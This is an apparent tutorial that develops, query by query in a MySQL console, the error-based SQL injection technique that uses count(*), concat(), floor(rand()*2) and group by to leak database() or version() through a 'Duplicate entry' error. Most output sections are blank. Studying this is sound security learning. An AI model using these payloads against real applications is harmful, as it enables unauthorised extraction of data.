Looking for a query with Error



Let's try to look for an Error.

a) Single select.

mysql> use security
mysql> select database();



Output:


Result: No error.

b) rying another stupid thing.

mysql> select(select(database()));


Output:


Result: No error.

c) Using concat().

mysql> select concat(database());


Output:


Result: No error.

d) Adding some fancy characters.

mysql> select concat(0x3a, 0x3a, database(), 0x3a, 0x3a);


0x3a = “:” colon.

Output:


Result: No error.

e) Adding an alias.

mysql> select concat(0x3a, 0x3a, database(), 0x3a, 0x3a)a;


Output:


Result: No error.

f) Adding combined functions, floor() and rand().

mysql> select concat(0x3a, 0x3a, database(), 0x3a, 0x3a, floor(rand()*2))a;


Output:




This query response sometimes 0 and sometimes 1.

Result: No error.

g) Adding columns from information_schema.

mysql> select concat(0x3a, 0x3a, database(), 0x3a, 0x3a, floor(rand()*2))a from
information_schema.columns;


Output:



Result: No error.

h) Adding tables from information_schema.

mysql> select concat(0x3a, 0x3a, database(), 0x3a, 0x3a, floor(rand()*2))a from
information_schema.tables;


Output:


Result: No error.

i) Adding count() and group by.

mysql> select count(*), concat(0x3a, 0x3a, database(), 0x3a, 0x3a, floor(rand()*2))a from information_schema.tables group by a;



Output:


We got 183 zeros and 163 ones.

If we try again:


We got different values.

After several tryings.

Result: We will get an error message.



The error “Duplicate entry” is a SQL error.

j) Using columns.

mysql> select count(*), concat(0x3a, 0x3a, database(), 0x3a, 0x3a, floor(rand()*2))a from information_schema.columns group by a;



The first try.

Output:


The second one.



Result: We get an error message again.

k) Let's try with “version()”.

mysql> select count(*), concat(0x3a, 0x3a, version(), 0x3a, 0x3a, floor(rand()*2))a from information_schema.columns group by a;


Output:


Result: It happens the same, sometimes we got the version and other times an error.


So, changing the query we can dump the SQL Error and in the error we can get the information we're looking for.
